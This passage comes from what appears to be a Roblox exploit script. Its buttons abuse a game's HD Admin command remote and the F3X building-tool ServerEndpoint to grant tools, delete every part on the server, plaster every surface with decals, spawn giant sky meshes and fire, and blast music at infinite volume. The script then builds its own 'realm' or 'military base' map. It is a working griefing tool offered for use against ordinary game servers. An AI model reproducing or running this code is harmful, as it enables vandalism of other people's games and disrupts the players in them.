         
            function SetMesh(part,meshid)
                local args = {
                    [1] = "SyncMesh",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["MeshId"] = "rbxassetid://"..meshid
                        }
                    }
                }
                _(args)
            end
            function SetTexture(part, texid)
                local args = {
                    [1] = "SyncMesh",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["TextureId"] = "rbxassetid://"..texid
                        }
                    }
                }
                _(args)
            end
            function SetName(part, stringg)
                local args = {
                    [1] = "SetName",
                    [2] = {
                        [1] = part
                    },
                    [3] = stringg
                }
         
                _(args)
            end
            function MeshResize(part,size)
                local args = {
                    [1] = "SyncMesh",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Scale"] = size
                        }
                    }
                }
                _(args)
            end
            function Weld(part1, part2,lead)
                local args = {
                    [1] = "CreateWelds",
                    [2] = {
                        [1] = part1,
                        [2] = part2
                    },
                    [3] = lead
                }
                _(args)
         
            end
            function SetLocked(part,boolean)
                local args = {
                    [1] = "SetLocked",
                    [2] = {
                        [1] = part
                    },
                    [3] = boolean
                }
                _(args)
            end
            function SetTrans(part,int)
                local args = {
                    [1] = "SyncMaterial",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Transparency"] = int
                        }
                    }
                }
                _(args)
            end
            function CreateSpotlight(part)
                local args = {
                    [1] = "CreateLights",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["LightType"] = "SpotLight"
                        }
                    }
                }
                _(args)
            end
            function SyncLighting(part,brightness)
                local args = {
                    [1] = "SyncLighting",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["LightType"] = "SpotLight",
                            ["Brightness"] = brightness
                        }
                    }
                }
                _(args)
            end
            function Color(part,color)
                local args = {
                    [1] = "SyncColor",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Color"] = color --[[Color3]],
                            ["UnionColoring"] = false
                        }
                    }
                }
                _(args)
            end
            function SpawnDecal(part,side)
                local args = {
                    [1] = "CreateTextures",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Face"] = side,
                            ["TextureType"] = "Decal"
                        }
                    }
                }
         
                _(args)
            end
            function AddDecal(part,asset,side)
                local args = {
                    [1] = "SyncTexture",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Face"] = side,
                            ["TextureType"] = "Decal",
                            ["Texture"] = "rbxassetid://".. asset
                        }
                    }
                }
                _(args)
            end
         
            function spam(id)
                for i,v in game.workspace:GetDescendants() do
                    if v:IsA("BasePart") then
                        spawn(function()
                            SetLocked(v,false)
                            SpawnDecal(v,Enum.NormalId.Front)
                            AddDecal(v,id,Enum.NormalId.Front)
         
                            SpawnDecal(v,Enum.NormalId.Back)
                            AddDecal(v,id,Enum.NormalId.Back)
         
                            SpawnDecal(v,Enum.NormalId.Right)
                            AddDecal(v,id,Enum.NormalId.Right)
         
                            SpawnDecal(v,Enum.NormalId.Left)
                            AddDecal(v,id,Enum.NormalId.Left)
         
                            SpawnDecal(v,Enum.NormalId.Bottom)
                            AddDecal(v,id,Enum.NormalId.Bottom)
         
                            SpawnDecal(v,Enum.NormalId.Top)
                            AddDecal(v,id,Enum.NormalId.Top)
                        end)
                    end
                end 
            end
            spam("75675290120492")
        wait(1)
        
            local player = game.Players.LocalPlayer
            local char = player.Character
            local tool
            for i,v in player:GetDescendants() do
                if v.Name == "SyncAPI" then
                    tool = v.Parent
                end
            end
            for i,v in game.ReplicatedStorage:GetDescendants() do
                if v.Name == "SyncAPI" then
                    tool = v.Parent
                end
            end
            --craaa
            remote = tool.SyncAPI.ServerEndpoint
            function _(args)
                remote:InvokeServer(unpack(args))
            end
            function SetCollision(part,boolean)
                local args = {
                    [1] = "SyncCollision",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["CanCollide"] = boolean
                        }
                    }
                }
                _(args)
            end
            function SetAnchor(boolean,part)
                local args = {
                    [1] = "SyncAnchor",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Anchored"] = boolean
                        }
                    }
                }
                _(args)
            end
            function CreatePart(cf,parent)
                local args = {
                    [1] = "CreatePart",
                    [2] = "Normal",
                    [3] = cf,
                    [4] = parent
                }
                _(args)
            end
            function DestroyPart(part)
                local args = {
                    [1] = "Remove",
                    [2] = {
                        [1] = part
                    }
                }
                _(args)
            end
            function MovePart(part,cf)
                local args = {
                    [1] = "SyncMove",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["CFrame"] = cf
                        }
                    }
                }
                _(args)
            end
            function Resize(part,size,cf)
                local args = {
                    [1] = "SyncResize",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["CFrame"] = cf,
                            ["Size"] = size
                        }
                    }
                }
                _(args)
            end
            function AddMesh(part)
                local args = {
                    [1] = "CreateMeshes",
                    [2] = {
                        [1] = {
                            ["Part"] = part
                        }
                    }
                }
                _(args)
            end
        
            function SetMesh(part,meshid)
                local args = {
                    [1] = "SyncMesh",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["MeshId"] = "rbxassetid://"..meshid
                        }
                    }
                }
                _(args)
            end
            function SetTexture(part, texid)
                local args = {
                    [1] = "SyncMesh",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["TextureId"] = "rbxassetid://"..texid
                        }
                    }
                }
                _(args)
            end
            function SetName(part, stringg)
                local args = {
                    [1] = "SetName",
                    [2] = {
                        [1] = part
                    },
                    [3] = stringg
                }
        
                _(args)
            end
            function MeshResize(part,size)
                local args = {
                    [1] = "SyncMesh",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Scale"] = size
                        }
                    }
                }
                _(args)
            end
            function Weld(part1, part2,lead)
                local args = {
                    [1] = "CreateWelds",
                    [2] = {
                        [1] = part1,
                        [2] = part2
                    },
                    [3] = lead
                }
                _(args)
        
            end
            function SetLocked(part,boolean)
                local args = {
                    [1] = "SetLocked",
                    [2] = {
                        [1] = part
                    },
                    [3] = boolean
                }
                _(args)
            end
            function SetTrans(part,int)
                local args = {
                    [1] = "SyncMaterial",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Transparency"] = int
                        }
                    }
                }
                _(args)
            end
            function CreateSpotlight(part)
                local args = {
                    [1] = "CreateLights",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["LightType"] = "SpotLight"
                        }
                    }
                }
                _(args)
            end
            function SyncLighting(part,brightness)
                local args = {
                    [1] = "SyncLighting",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["LightType"] = "SpotLight",
                            ["Brightness"] = brightness
                        }
                    }
                }
                _(args)
            end
            function Color(part,color)
                local args = {
                    [1] = "SyncColor",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Color"] = color --[[Color3]],
                            ["UnionColoring"] = false
                        }
                    }
                }
                _(args)
            end
            function SpawnDecal(part,side)
                local args = {
                    [1] = "CreateTextures",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Face"] = side,
                            ["TextureType"] = "Decal"
                        }
                    }
                }
        
                _(args)
            end
            function AddDecal(part,asset,side)
                local args = {
                    [1] = "SyncTexture",
                    [2] = {
                        [1] = {
                            ["Part"] = part,
                            ["Face"] = side,
                            ["TextureType"] = "Decal",
                            ["Texture"] = "rbxassetid://".. asset
                        }
                    }
                }
                _(args)
            end
        
            function Sky(id)
                e = char.HumanoidRootPart.CFrame.x
                f = char.HumanoidRootPart.CFrame.y
                g = char.HumanoidRootPart.CFrame.z
                CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
                for i,v in game.Workspace:GetDescendants() do
                    if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
                        --spawn(function()
                        SetName(v,"Sky")
                        AddMesh(v)
                        --end)
                        --spawn(function()
                        SetMesh(v,"111891702759441")
                        SetTexture(v,id)
                        --end)
                        MeshResize(v,Vector3.new(6000,6000,6000))
                        SetLocked(v,true)
                    end
                end
            end
            Sky("75675290120492")
        wait(1)
        		local function applyDecorationToPart(part)
        			local argsCreate = {
        				[1] = "CreateDecorations",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["DecorationType"] = "Fire"
        					}
        				}
        			}
        
        			local argsSync = {
        				[1] = "SyncDecorate",
        				[2] = {
        					[1] = {
        						["Part"] = part,
        						["DecorationType"] = "Fire",
        						["Size"] = 20
        					}
        				}
        			}
        
        			local buildingTools = nil
        			local player = game:GetService("Players").LocalPlayer
        
        			-- Search for the tool in Character and Backpack
        			for _, item in pairs(player.Character:GetChildren()) do
        				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
        					buildingTools = item
        					break
        				end
        			end
        
        			if not buildingTools then
        				for _, item in pairs(player.Backpack:GetChildren()) do
        					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
        						buildingTools = item
        						break
        					end
        				end
        			end
        
        			if buildingTools then
        				buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
        				buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
        			elseif not warned then
        				warn("Building tool not found")
        				warned = true
        			end
        		end
        
        		local function applyDecorationToAllParts(workspaceObject)
        			for _, obj in pairs(workspaceObject:GetDescendants()) do
        				if obj:IsA("Part") or obj:IsA("MeshPart") then
        					applyDecorationToPart(obj)
        				end
        			end
        		end
        
        		applyDecorationToAllParts(workspace)
        end)

createButton(realmsScroll, "0nkidd Realm", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    local tool = getF3XTool()
    if not tool then return end
    local remote = tool.SyncAPI.ServerEndpoint
    for _,v in workspace:GetDescendants() do
        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(1)
    local baseCF = CFrame.new(0,0,0)
    local base = remote:InvokeServer("CreatePart","Normal",baseCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=base,CFrame=baseCF,Size=Vector3.new(500,5,500)} })
    remote:InvokeServer("SyncMaterial",{ {Part=base,Material=Enum.Material.Neon} })
    remote:InvokeServer("SyncColor",{ {Part=base,Color=Color3.fromRGB(0,150,255)} })
    remote:InvokeServer("SetLocked",{base},true)

    local angleCF = CFrame.new(0,20,0) * CFrame.Angles(0,0,math.rad(70))
    local p = remote:InvokeServer("CreatePart","Normal",angleCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=p,CFrame=angleCF,Size=Vector3.new(100,200,10)} })
    remote:InvokeServer("SyncMaterial",{ {Part=p,Material=Enum.Material.Neon} })
    remote:InvokeServer("SyncColor",{ {Part=p,Color=Color3.fromRGB(255,0,150)} })
    remote:InvokeServer("CreateTextures",{ {Part=p,Face=Enum.NormalId.Front,TextureType="Decal"} })
    remote:InvokeServer("SyncTexture",{ {Part=p,Face=Enum.NormalId.Front,TextureType="Decal",Texture="rbxassetid://121255560184231"} })
    remote:InvokeServer("SetLocked",{p},true)

    local skyCF = CFrame.new(0,5,0)
    local sky = remote:InvokeServer("CreatePart","Normal",skyCF,workspace)
    remote:InvokeServer("CreateMeshes",{ {Part=sky} })
    remote:InvokeServer("SyncMesh",{ {Part=sky,MeshId="rbxassetid://111891702759441",TextureId="rbxassetid://104235488875041",Scale=Vector3.new(10000,10000,10000)} })
    remote:InvokeServer("SetLocked",{sky},true)

    local char = player.Character
    if char and char.PrimaryPart then
        char:SetPrimaryPartCFrame(CFrame.new(0,10,0))
    end
    Request:InvokeServer(";music 134884767490882")
    Request:InvokeServer(";volume inf")
end)

createButton(realmsScroll, "Noot Noot !", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools ;hg NOOT NOOT !! (remake by 0nkidd)")
    Request:InvokeServer(";music 236932924 ;volume inf ;disco")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("382332426")

	-----------------------------------

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("382332426")

	-----------
end)

createButton(realmsScroll, "0nkidd Realm v2", function()
    local Request = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Request:InvokeServer(";btools")
    local tool = getF3XTool()
    if not tool then return end
    local remote = tool.SyncAPI.ServerEndpoint
    for _,v in workspace:GetDescendants() do
        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    task.wait(1)
    local baseCF = CFrame.new(0,0,0)
    local base = remote:InvokeServer("CreatePart","Normal",baseCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=base,CFrame=baseCF,Size=Vector3.new(100,5,100)} })
    remote:InvokeServer("SyncMaterial",{ {Part=base,Material=Enum.Material.Neon} })
    remote:InvokeServer("SyncColor",{ {Part=base,Color=Color3.fromRGB(0,150,255)} })
    remote:InvokeServer("SetLocked",{base},true)

    local wallCF = CFrame.new(0,15,20)
    local wall = remote:InvokeServer("CreatePart","Normal",wallCF,workspace)
    remote:InvokeServer("SyncResize",{ {Part=wall,CFrame=wallCF,Size=Vector3.new(50,30,2)} })
    remote:InvokeServer("SyncMaterial",{ {Part=wall,Material=Enum.Material.Neon} })
    remote:InvokeServer("SyncColor",{ {Part=wall,Color=Color3.fromRGB(255,0,150)} })
    remote:InvokeServer("CreateTextures",{ {Part=wall,Face=Enum.NormalId.Front,TextureType="Decal"} })
    remote:InvokeServer("SyncTexture",{ {Part=wall,Face=Enum.NormalId.Front,TextureType="Decal",Texture="rbxassetid://122891033183126"} })
    remote:InvokeServer("SetLocked",{wall},true)

    local char = player.Character
    if char and char.PrimaryPart then
        char:SetPrimaryPartCFrame(CFrame.new(0,10,0))
    end
end)
    
createButton(realmsScroll, "0nkidd military base", function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    
    -- Önce her şeyi temizle
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    RequestCommand:InvokeServer(";time 12")
    
    wait(1)
    
    local f3x = getF3XTool()
    if not f3x then
        warn("F3X tool bulunamadı!")
        return
    end
    
    local syncAPI = f3x.SyncAPI
    local serverEndpoint = syncAPI.ServerEndpoint
    
    -- TÜM PARTLARI SİL
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("UnionOperation") or v:IsA("Model") then
            spawn(function()
                pcall(function()
                    serverEndpoint:InvokeServer("Remove", {v})
                end)
            end)
        end
    end
    
    wait(2)
    
    -- BASEPLATE 
    local baseplate = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 0, 0), workspace)
    serverEndpoint:InvokeServer("SyncResize", {
        {["Part"] = baseplate, ["CFrame"] = CFrame.new(0, 0, 0), ["Size"] = Vector3.new(300, 5, 300)}
    })
    serverEndpoint:InvokeServer("SyncColor", {
        {["Part"] = baseplate, ["Color"] = Color3.fromRGB(0, 0, 0), ["UnionColoring"] = false}
    })
    serverEndpoint:InvokeServer("SetLocked", {baseplate}, true)
    serverEndpoint:InvokeServer("SetName", {baseplate}, "Baseplate")
    
    -- SKYBOX 
    local skyPosition = CFrame.new(0, 50, 0)
    local skyPart = serverEndpoint:InvokeServer("CreatePart", "Normal", skyPosition, workspace)
    serverEndpoint:InvokeServer("CreateMeshes", {
        {["Part"] = skyPart}
    })
    serverEndpoint:InvokeServer("SyncMesh", {
        {["Part"] = skyPart, ["MeshId"] = "rbxassetid://111891702759441"}
    })
    serverEndpoint:InvokeServer("SyncMesh", {
        {["Part"] = skyPart, ["TextureId"] = "rbxassetid://131917032785234"}
    })
    serverEndpoint:InvokeServer("SyncMesh", {
        {["Part"] = skyPart, ["Scale"] = Vector3.new(10000, 10000, 10000)}
    })
    serverEndpoint:InvokeServer("SetLocked", {skyPart}, true)
    serverEndpoint:InvokeServer("SetName", {skyPart}, "Sky")
    
    -- military base
    local function createMilitaryBase()
        -- SAFE ROOM
        -- Safe Room Zemin
        local safeRoomFloor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 2.5, 0), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = safeRoomFloor, ["CFrame"] = CFrame.new(0, 2.5, 0), ["Size"] = Vector3.new(20, 1, 20)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = safeRoomFloor, ["Color"] = Color3.fromRGB(0, 0, 0), ["UnionColoring"] = false}
        })
        
        -- Safe Room Duvarlar (Siyah)
        local safeRoomWalls = {
            {pos = CFrame.new(0, 5, 10), size = Vector3.new(20, 10, 1)},   
            {pos = CFrame.new(0, 5, -10), size = Vector3.new(20, 10, 1)},  
            {pos = CFrame.new(10, 5, 0), size = Vector3.new(1, 10, 20)},   
            {pos = CFrame.new(-10, 5, 0), size = Vector3.new(1, 10, 20)}   
        }
        
        for _, wall in ipairs(safeRoomWalls) do
            local wallPart = serverEndpoint:InvokeServer("CreatePart", "Normal", wall.pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = wallPart, ["CFrame"] = wall.pos, ["Size"] = wall.size}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = wallPart, ["Color"] = Color3.fromRGB(0, 0, 0), ["UnionColoring"] = false}
            })
        end
        
        -- Safe Room (Disable Collision)
        local safeRoomDoor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 3, -9.5), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = safeRoomDoor, ["CFrame"] = CFrame.new(0, 3, -9.5), ["Size"] = Vector3.new(4, 6, 1)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = safeRoomDoor, ["Color"] = Color3.fromRGB(50, 50, 50), ["UnionColoring"] = false}
        })
        serverEndpoint:InvokeServer("SyncCollision", {
            {["Part"] = safeRoomDoor, ["CanCollide"] = false}
        })
        
        -- SAFE ROOM
        local safeRoomSign = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 8, -9.6), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = safeRoomSign, ["CFrame"] = CFrame.new(0, 8, -9.6), ["Size"] = Vector3.new(6, 1, 0.2)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = safeRoomSign, ["Color"] = Color3.fromRGB(255, 255, 255), ["UnionColoring"] = false}
        })
        
        -- Safe Room Masa
        local safeRoomTable = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 3, 5), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = safeRoomTable, ["CFrame"] = CFrame.new(0, 3, 5), ["Size"] = Vector3.new(6, 1, 3)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = safeRoomTable, ["Color"] = Color3.fromRGB(30, 30, 30), ["UnionColoring"] = false}
        })
        
        -- Masa Paper
        local paper = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 3.6, 5), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = paper, ["CFrame"] = CFrame.new(0, 3.6, 5), ["Size"] = Vector3.new(4, 0.1, 2)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = paper, ["Color"] = Color3.fromRGB(255, 255, 255), ["UnionColoring"] = false}
        })
        
        -- Koridor Zemin
        local corridorFloor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 2.5, -20), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
            {["Part"] = corridorFloor, ["CFrame"] = CFrame.new(0, 2.5, -20), ["Size"] = Vector3.new(10, 1, 20)}
        })
        serverEndpoint:InvokeServer("SyncColor", {
            {["Part"] = corridorFloor, ["Color"] = Color3.fromRGB(20, 20, 20), ["UnionColoring"] = false}
        })
        
        -- Koridor Duvarlar
        local corridorWalls = {
            {pos = CFrame.new(5, 5, -20), size = Vector3.new(1, 10, 20)},  
            {pos = CFrame.new(-5, 5, -20), size = Vector3.new(1, 10, 20)}   
        }
        
        for _, wall in ipairs(corridorWalls) do
            local wallPart = serverEndpoint:InvokeServer("CreatePart", "Normal", wall.pos, workspace)
            serverEndpoint:InvokeServer("SyncResize", {
                {["Part"] = wallPart, ["CFrame"] = wall.pos, ["Size"] = wall.size}
            })
            serverEndpoint:InvokeServer("SyncColor", {
                {["Part"] = wallPart, ["Color"] = Color3.fromRGB(30, 30, 30), ["UnionColoring"] = false}
            })
        end
        
        -- Yemekhane Zemin
        local cafeteriaFloor = serverEndpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 2.5, -45), workspace)
        serverEndpoint:InvokeServer("SyncResize", {
